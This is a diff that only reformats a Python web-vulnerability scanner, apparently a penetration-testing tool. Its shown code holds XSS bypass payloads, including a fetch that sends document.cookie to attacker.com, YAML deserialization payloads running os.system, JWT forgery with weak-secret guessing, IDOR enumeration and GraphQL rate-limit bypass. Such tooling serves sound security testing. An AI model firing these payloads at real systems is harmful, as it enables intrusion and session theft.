@@ -108,9 +108,7 @@ def detect_defenses(
             try:
                 r = session.get(base_url.rstrip("/") + path + payload, timeout=5)
                 if r.status_code in (403, 406, 429, 501):
-                    defenses["evidence"].append(
-                        f"{vtype} probe → {r.status_code} (likely blocked)"
-                    )
+                    defenses["evidence"].append(f"{vtype} probe → {r.status_code} (likely blocked)")
                     if not defenses["waf"]:
                         defenses["waf"] = "Generic WAF (status-based detection)"
                 body_lower = r.text.lower()[:2000]
@@ -126,9 +124,7 @@ def detect_defenses(
                 ]:
                     if indicator in body_lower:
                         defenses["waf"] = name
-                        defenses["evidence"].append(
-                            f"Body match: '{indicator}' on {vtype} probe"
-                        )
+                        defenses["evidence"].append(f"Body match: '{indicator}' on {vtype} probe")
                         break
             except requests.exceptions.RequestException:
                 pass
@@ -174,15 +170,15 @@ def detect_defenses(
             payload = f"{marker}{char}{marker}"
             r = session.get(base_url, params={"q": payload}, timeout=3)
             if marker in r.text:
-                m = re.search(
-                    re.escape(marker) + r"(.*?)" + re.escape(marker), r.text, re.DOTALL
-                )
+                m = re.search(re.escape(marker) + r"(.*?)" + re.escape(marker), r.text, re.DOTALL)
                 if m and m.group(1) != char:
-                    defenses["input_filters"].append({
-                        "char": name,
-                        "original": repr(char),
-                        "reflected_as": repr(m.group(1)),
-                    })
+                    defenses["input_filters"].append(
+                        {
+                            "char": name,
+                            "original": repr(char),
+                            "reflected_as": repr(m.group(1)),
+                        }
+                    )
     except requests.exceptions.RequestException:
         pass
 
@@ -281,9 +277,7 @@ def test_race_condition(
         "total_requests": total_requests,
         "total_time": elapsed,
         "raced": raced,
-        "first_success": next(
-            (r for r in results if 200 <= r.get("status", 0) < 300), None
-        ),
+        "first_success": next((r for r in results if 200 <= r.get("status", 0) < 300), None),
     }
 
 
@@ -375,12 +369,14 @@ def test_xxe(
             else:
                 print(f"[-] No change: {name}")
 
-            results.append({
-                "payload": name,
-                "confirmed": confirmed,
-                "indicators": indicators,
-                "status": r.status_code,
-            })
+            results.append(
+                {
+                    "payload": name,
+                    "confirmed": confirmed,
+                    "indicators": indicators,
+                    "status": r.status_code,
+                }
+            )
         except requests.exceptions.RequestException as e:
             print(f"[!] {name} failed: {e}")
 
@@ -471,13 +467,9 @@ def test_yaml_deserialization(
     marker_file = f"/tmp/yaml_marker_{int(time.time())}"
 
     payloads = {
-        "python_object_apply": (
-            f"!!python/object/apply:os.system ['touch {marker_file}']"
-        ),
+        "python_object_apply": (f"!!python/object/apply:os.system ['touch {marker_file}']"),
         # Fixed: properly quoted YAML for object/new
-        "python_object_new": (
-            f"!!python/object/new:os.system ['touch {marker_file}']"
-        ),
+        "python_object_new": (f"!!python/object/new:os.system ['touch {marker_file}']"),
     }
 
     results: list[dict[str, Any]] = []
@@ -618,9 +610,7 @@ def test_jwt_attacks(
     hs256_empty = forge_jwt_hs256(escalated, "")
     print("\n[*] Attack 2: HS256 with empty secret")
     try:
-        r = session.get(
-            test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5
-        )
+        r = session.get(test_target, headers={header_name: header_prefix + hs256_empty}, timeout=5)
         if _is_admin_response(r):
             print("[!] HS256 with empty secret ACCEPTED")
         else:
@@ -631,16 +621,22 @@ def test_jwt_attacks(
     # Attack 3: HS256 with weak secrets
     print("\n[*] Attack 3: HS256 with weak secret bruteforce (top 10)")
     weak_secrets = [
-        "secret", "password", "key", "jwt", "admin", "test", "12345",
-        "your-256-bit-secret", "default", "changeme",
+        "secret",
+        "password",
+        "key",
+        "jwt",
+        "admin",
+        "test",
+        "12345",
+        "your-256-bit-secret",
+        "default",
+        "changeme",
     ]
     weak_found = False
     for sec in weak_secrets:
         forged = forge_jwt_hs256(escalated, sec)
         try:
-            r = session.get(
-                test_target, headers={header_name: header_prefix + forged}, timeout=3
-            )
+            r = session.get(test_target, headers={header_name: header_prefix + forged}, timeout=3)
             if _is_admin_response(r):
                 print(f"[!] HS256 with secret '{sec}' ACCEPTED")
                 weak_found = True
@@ -748,17 +744,32 @@ def test_file_upload(
 XSS_PAYLOAD_LADDER: list[dict[str, str]] = [
     {"name": "script_tag", "payload": "<script>alert(1)</script>", "bypasses": "none"},
     {"name": "svg_onload", "payload": "<svg onload=alert(1)>", "bypasses": "script_blocked"},
-    {"name": "details_ontoggle", "payload": "<details open ontoggle=alert(1)>",
-     "bypasses": "common_tags_blocked"},
-    {"name": "img_onerror", "payload": '<img src=x onerror="alert(1)">',
-     "bypasses": "alert_blocked_via_event"},
-    {"name": "svg_animate", "payload": '<svg><animate onbegin=alert(1) attributeName=x>',
-     "bypasses": "img_blocked"},
-    {"name": "body_onload", "payload": '<body onload=alert(1)>', "bypasses": "svg_blocked"},
-    {"name": "input_focus", "payload": '<input onfocus=alert(1) autofocus>',
-     "bypasses": "body_blocked"},
-    {"name": "marker_fetch", "payload": '<img src=x onerror="fetch(\'http://attacker.com/'+
-     'x?\'+document.cookie)">', "bypasses": "alert_blocked_exfil"},
+    {
+        "name": "details_ontoggle",
+        "payload": "<details open ontoggle=alert(1)>",
+        "bypasses": "common_tags_blocked",
+    },
+    {
+        "name": "img_onerror",
+        "payload": '<img src=x onerror="alert(1)">',
+        "bypasses": "alert_blocked_via_event",
+    },
+    {
+        "name": "svg_animate",
+        "payload": "<svg><animate onbegin=alert(1) attributeName=x>",
+        "bypasses": "img_blocked",
+    },
+    {"name": "body_onload", "payload": "<body onload=alert(1)>", "bypasses": "svg_blocked"},
+    {
+        "name": "input_focus",
+        "payload": "<input onfocus=alert(1) autofocus>",
+        "bypasses": "body_blocked",
+    },
+    {
+        "name": "marker_fetch",
+        "payload": "<img src=x onerror=\"fetch('http://attacker.com/" + "x?'+document.cookie)\">",
+        "bypasses": "alert_blocked_exfil",
+    },
 ]
 
 
@@ -801,8 +812,11 @@ def test_xss(
 
         escaped_variants = [
             payload.replace("<", "&lt;").replace(">", "&gt;"),
-            payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
-            .replace('"', "&quot;").replace("'", "&#x27;"),
+            payload.replace("&", "&amp;")
+            .replace("<", "&lt;")
+            .replace(">", "&gt;")
+            .replace('"', "&quot;")
+            .replace("'", "&#x27;"),
         ]
         escaped_reflection = any(v in r.text for v in escaped_variants) and not reflected
 
@@ -814,8 +828,11 @@ def test_xss(
             print(f"[!] XSS CONFIRMED: {name} — payload reflected unescaped!")
             if scanner is not None:
                 scanner._record_finding(
-                    url, method, name,
-                    ["xss_reflected"], [f"Payload reflected unescaped: {entry['payload']}"],
+                    url,
+                    method,
+                    name,
+                    ["xss_reflected"],
+                    [f"Payload reflected unescaped: {entry['payload']}"],
                     "xss",
                 )
         elif escaped_reflection:
@@ -825,14 +842,16 @@ def test_xss(
         else:
             print(f"[-] {name} — not reflected")
 
-        results.append({
-            "payload": name,
-            "reflected": reflected,
-            "escaped": escaped_reflection,
-            "confirmed": confirmed,
-            "bypasses": entry["bypasses"],
-            "status": r.status_code,
-        })
+        results.append(
+            {
+                "payload": name,
+                "reflected": reflected,
+                "escaped": escaped_reflection,
+                "confirmed": confirmed,
+                "bypasses": entry["bypasses"],
+                "status": r.status_code,
+            }
+        )
 
     return results
 
@@ -903,22 +922,28 @@ def test_idor(
             status_match = r.status_code == baseline.status_code
 
             if not same and r.status_code == 200:
-                distinct_responses.append({
+                distinct_responses.append(
+                    {
+                        "id": test_id,
+                        "status": r.status_code,
+                        "length": len(r.text),
+                        "length_diff": len(r.text) - len(baseline_text),
+                        "similarity": round(similarity, 3),
+                    }
+                )
+                print(
+                    f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(r.text) - len(baseline_text):+d})"
+                )
+
+            results.append(
+                {
                     "id": test_id,
                     "status": r.status_code,
                     "length": len(r.text),
-                    "length_diff": len(r.text) - len(baseline_text),
-                    "similarity": round(similarity, 3),
-                })
-                print(f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(r.text) - len(baseline_text):+d})")
-
-            results.append({
-                "id": test_id,
-                "status": r.status_code,
-                "length": len(r.text),
-                "same_as_baseline": same,
-                "status_match": status_match,
-            })
+                    "same_as_baseline": same,
+                    "status_match": status_match,
+                }
+            )
         except requests.exceptions.RequestException as e:
             print(f"[!] ID={test_id} failed: {e}")
 
@@ -935,7 +960,9 @@ def test_idor(
         print(f"\n[!] IDOR LIKELY — {len(distinct_responses)} distinct 200-OK responses found")
         if scanner is not None:
             scanner._record_finding(
-                url_template, method, "idor_scan",
+                url_template,
+                method,
+                "idor_scan",
                 ["idor_distinct_response"],
                 [f"Found {len(distinct_responses)} distinct 200-OK responses across different IDs"],
                 "idor",
@@ -980,8 +1007,7 @@ def test_graphql_alias_batch(
 
     # Build aliases: m0: field_name(param_name:"v0"){success}, m1: ...
     alias_block = " ".join(
-        f"m{i}: {field_name}({param_name}:\"{v}\"){{success}}"
-        for i, v in enumerate(values)
+        f'm{i}: {field_name}({param_name}:"{v}"){{success}}' for i, v in enumerate(values)
     )
 
     query = query_template.replace("{ALIASES}", alias_block)
@@ -1021,7 +1047,9 @@ def test_graphql_alias_batch(
         print(f"[!] {len(successes)} successful values found in one request!")
         if scanner_obj is not None:
             scanner_obj._record_finding(
-                url, "POST", "graphql_alias_batch",
+                url,
+                "POST",
+                "graphql_alias_batch",
                 ["graphql_batch_success"],
                 [f"{len(successes)} values succeeded in a single request (rate limit bypass)"],
                 "graphql",
@@ -1065,12 +1093,14 @@ class ChainContext:
         print(f"[+] Credential captured: {user} (source: {source})")
 
     def add_finding(self, vuln_type: str, endpoint: str, details: str) -> None:
-        self.findings.append({
-            "type": vuln_type,
-            "endpoint": endpoint,
-            "details": details,
-            "timestamp": datetime.now().isoformat(),
-        })
+        self.findings.append(
+            {
+                "type": vuln_type,
+                "endpoint": endpoint,
+                "details": details,
+                "timestamp": datetime.now().isoformat(),
+            }
+        )
 
     def try_endpoints_with_token(
         self, token_name: str, endpoints: list[str], base_url: str
@@ -1094,12 +1124,14 @@ class ChainContext:
                     if r.status_code == 200 and len(r.text) > 100:
                         header_used = next(iter(header_format.keys()))
                         print(f"[+] {ep} accepted with {header_used} → {r.status_code}")
-                        results.append({
-                            "endpoint": ep,
-                            "header": header_format,
-                            "status": r.status_code,
-                            "length": len(r.text),
-                        })
+                        results.append(
+                            {
+                                "endpoint": ep,
+                                "header": header_format,
+                                "status": r.status_code,
+                                "length": len(r.text),
+                            }
+                        )
                         break
                 except requests.exceptions.RequestException:
                     continue
@@ -1178,12 +1210,14 @@ def generate_report(
         lines.extend(["## Summary", "", "No vulnerabilities detected."])
         return "\n".join(lines)
 
-    lines.extend([
-        "## Summary",
-        "",
-        "| Indicator | Count |",
-        "|:----------|:------|",
-    ])
+    lines.extend(
+        [
+            "## Summary",
+            "",
+            "| Indicator | Count |",
+            "|:----------|:------|",
+        ]
+    )
     for ind, items in sorted(by_indicator.items(), key=lambda x: -len(x[1])):
         lines.append(f"| {ind} | {len(items)} |")
     lines.append("")
@@ -1197,13 +1231,15 @@ def generate_report(
             if SEVERITY_ORDER.get(s, 0) > SEVERITY_ORDER.get(max_sev, 0):
                 max_sev = s
 
-        lines.extend([
-            f"### Finding #{i}: {max_sev} — {f.get('type', 'vulnerability')}",
-            "",
-            f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`",
-            f"- **Method:** {f.get('method', 'N/A')}",
-            f"- **Payload:** `{f.get('payload', 'N/A')}`",
-        ])
+        lines.extend(
+            [
+                f"### Finding #{i}: {max_sev} — {f.get('type', 'vulnerability')}",
+                "",
+                f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`",
+                f"- **Method:** {f.get('method', 'N/A')}",
+                f"- **Payload:** `{f.get('payload', 'N/A')}`",
+            ]
+        )
         if indicators:
             lines.append(f"- **Indicators:** {', '.join(indicators)}")
         if f.get("details"):
